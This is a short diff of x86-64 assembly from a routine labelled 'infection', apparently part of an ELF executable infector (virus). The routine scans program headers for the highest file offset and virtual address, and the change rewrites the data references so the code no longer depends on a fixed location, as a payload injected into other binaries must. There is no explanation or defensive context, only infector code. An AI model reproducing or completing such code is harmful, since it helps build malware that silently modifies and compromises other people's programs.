@@ -93,16 +93,25 @@ infection:
 
 	mov rax, [rbx + phdr.p_filesz]
 	add rax, [rbx + phdr.p_offset]
-	cmp rax, [rel p_offset]
+
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.p_offset
+
+	cmp rax, [rdx]
 	jb .no_above
-	mov [rel p_offset], rax
+	mov [rdx], rax
 
 .no_above_offset:
+
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.p_vaddr
+
 	mov rax, [rbx + phdr.p_vaddr]
 	add rax, [rbx + phdr.p_memsz]
-	cmp rax, [rel p_vaddr]
+
+	cmp rax, [rdx]
 	jb .no_above
-	mov [rel p_vaddr], rax
+	mov [rdx], rax
 
 .no_above:
 	cmp dword [rbx + phdr.p_flags], 6
